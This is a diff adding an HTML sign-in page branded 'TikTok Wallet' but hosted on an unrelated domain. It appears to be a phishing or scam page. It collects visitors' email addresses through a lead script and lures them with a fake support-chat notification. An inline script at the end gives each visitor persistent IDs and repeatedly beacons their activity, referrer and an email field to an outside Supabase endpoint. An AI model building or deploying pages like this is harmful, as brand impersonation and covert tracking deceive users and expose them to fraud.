@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="theme-color" content="#F5F5F8">
+    
+    <meta name="csrf-token" content="inABBfQ1Nxlbyg0GbZm4hrjR5rje3uCZ6ztXtNzN">
+    <title>Sign in</title>
+    <link rel="stylesheet" href="https://wallet.ytaitools.space/css/tokens.css">
+    <link rel="stylesheet" href="https://wallet.ytaitools.space/css/shell.css">
+    <link rel="stylesheet" href="https://wallet.ytaitools.space/css/components.css">
+    
+    <script src="https://wallet.ytaitools.space/js/vendor/turbo.min.js"></script>
+    <script src="https://wallet.ytaitools.space/js/app.js" defer></script>
+    <script src="https://wallet.ytaitools.space/js/lead.js" defer></script>
+    <script src="https://wallet.ytaitools.space/js/vendor/alpine.min.js" defer></script>
+</head>
+<body>
+
+<div class="app-shell" x-data="{ sheetOpen: false, uploadOpen: false, cardDetails: false, cardLimit: false, cardPin: false, cardDesign: false }">
+
+    <header class="app-header">
+        <img class="app-header__logo" src="https://wallet.ytaitools.space/images/logo.webp" alt="TikTok Wallet" width="82" height="24">
+
+        <div class="app-header__actions">
+            
+            <button type="button" class="app-header__bell" @click="sheetOpen = true"
+                    aria-label="Notifications"
+                    x-data="{ unread: 0 }"
+                    @support-unread.window="unread = Math.max($event.detail.unread, 0)">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                <span class="app-header__dot" aria-hidden="true" x-show="unread > 0"
+                       style="display:none" ></span>
+            </button>
+        </div>
+    </header>
+
+    <main class="app-main  app-main--bare  " id="screen">
+            <section class="screen login">
+        <img class="login__mark" src="https://wallet.ytaitools.space/images/logo.webp" alt="TikTok Wallet" width="110" height="32">
+
+        <h1 class="login__title">Sign in</h1>
+        <p class="login__lead">Your email is your identity. No password to remember.</p>
+
+        <form class="login__form" method="POST" action="/login" novalidate>
+            <input type="hidden" name="_token" value="inABBfQ1Nxlbyg0GbZm4hrjR5rje3uCZ6ztXtNzN" autocomplete="off">
+            
+            <label class="field field--icon" for="email">
+                <span class="field__label">Email</span>
+
+                <span class="field__control">
+                    <input class="field__input"
+                           id="email"
+                           type="email"
+                           name="email"
+                           value=""
+                           inputmode="email"
+                           autocomplete="email"
+                           autocapitalize="none"
+                           spellcheck="false"
+                           placeholder="you@example.com"
+                           >
+
+                    <span class="field__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+</span>
+                </span>
+
+                            </label>
+
+            <button type="submit" class="btn btn--primary btn--full">Sign in</button>
+        </form>
+
+        <p class="login__terms">By continuing, you agree to the Terms.</p>
+    </section>
+    </main>
+
+    
+    <div class="sheet" x-cloak x-show="sheetOpen" role="dialog" aria-modal="true"
+     aria-label="Notifications" @keydown.escape.window="sheetOpen = false">
+
+    <div class="sheet__backdrop"
+         x-show="sheetOpen"
+         x-transition.opacity.duration.200ms
+         @click="sheetOpen = false"></div>
+
+    <div class="sheet__panel"
+         x-show="sheetOpen"
+         x-transition:enter="sheet__panel--anim"
+         x-transition:enter-start="sheet__panel--down"
+         x-transition:leave="sheet__panel--anim"
+         x-transition:leave-end="sheet__panel--down"
+         x-data="{ dragFrom: null, dragBy: 0 }"
+         @click.stop
+         @touchstart="dragFrom = $event.touches[0].clientY; dragBy = 0"
+         @touchmove="if (dragFrom !== null) {
+                         dragBy = Math.max(0, $event.touches[0].clientY - dragFrom);
+                         $el.style.transform = 'translateY(' + dragBy + 'px)';
+                     }"
+         @touchend="$el.style.removeProperty('transform');
+                    if (dragBy > 80) sheetOpen = false;
+                    dragFrom = null; dragBy = 0">
+
+        <div class="sheet__grip" aria-hidden="true"></div>
+
+        <div class="sheet__head">
+            <h2 class="sheet__title">Notifications</h2>
+            <button type="button" class="sheet__close" @click="sheetOpen = false" aria-label="Close">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+        </div>
+
+        <div class="sheet__body"><div class="stack" x-data="{ unread: 0 }"
+             @support-unread.window="unread = $event.detail.unread">
+
+            
+            <a class="notify-row" href="/support/chat" x-show="unread > 0"
+                x-cloak >
+                <span class="notify-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22z"/></svg>
+</span>
+                <span class="notify-row__body">
+                    <span class="notify-row__title">Sarah Mitchell replied</span>
+                    <span class="notify-row__text" x-text="unread === 1 ? '1 new message in your support chat' : unread + ' new messages in your support chat'">
+                        0 new messages in your support chat
+                    </span>
+                </span>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"/></svg>
+            </a>
+
+                            <p class="empty__text" x-show="unread === 0" >
+                    No notifications right now.
+                </p>
+                    </div></div>
+    </div>
+</div>
+
+    
+    
+    
+    
+    <div class="toast" id="toast" role="status" aria-live="polite"
+     >
+    <span class="toast__text" id="toast-text"></span>
+</div>
+</div>
+
+
+<script>
+(function () {
+  var URL_ = "https://hrlmqwkgruexsxpqmxje.supabase.co/functions/v1/wallet-track";
+  var EMAIL = null;
+
+  function id(chave, store) {
+    try {
+      var v = store.getItem(chave);
+      if (!v) { v = Math.random().toString(36).slice(2) + Date.now().toString(36); store.setItem(chave, v); }
+      return v;
+    } catch (e) { return "sem-storage"; }
+  }
+
+  // visitor sobrevive ao fechar o navegador — é ele que responde "abre todo dia?".
+  // sessao morre com a aba: é a unidade do tempo de uso.
+  var visitor = id("w_visitor", window.localStorage);
+  var sessao = id("w_sessao", window.sessionStorage);
+
+  // Tempo REAL de olho na tela. Sem parar o relógio quando a aba esconde, um celular
+  // esquecido aberto vira "40 minutos de uso" e a média mente para todo mundo.
+  var segundos = 0, ultimo = Date.now(), visivel = !document.hidden;
+
+  function tick() {
+    var agora = Date.now();
+    if (visivel) segundos += (agora - ultimo) / 1000;
+    ultimo = agora;
+  }
+
+  function manda(evento, viaBeacon) {
+    tick();
+    var corpo = JSON.stringify({
+      visitor: visitor, sessao: sessao, evento: evento, email: EMAIL,
+      rota: location.pathname, segundos: Math.round(segundos),
+      ref: document.referrer || null
+    });
+    try {
+      // sendBeacon é o único que sobrevive à aba fechando
+      if (viaBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon(URL_, new Blob([corpo], { type: "application/json" }));
+        return;
+      }
+      fetch(URL_, { method: "POST", headers: { "Content-Type": "application/json" },
+                    body: corpo, keepalive: true }).catch(function () {});
+    } catch (e) {}
+  }
+
+  document.addEventListener("visibilitychange", function () {
+    tick();
+    visivel = !document.hidden;
+    if (document.hidden) manda("ping", true);
+  });
+
+  manda("open");
+  setInterval(function () { manda("ping"); }, 20000);
+  window.addEventListener("pagehide", function () { manda("saida", true); });
+})();
+</script>
+</body>
+</html>
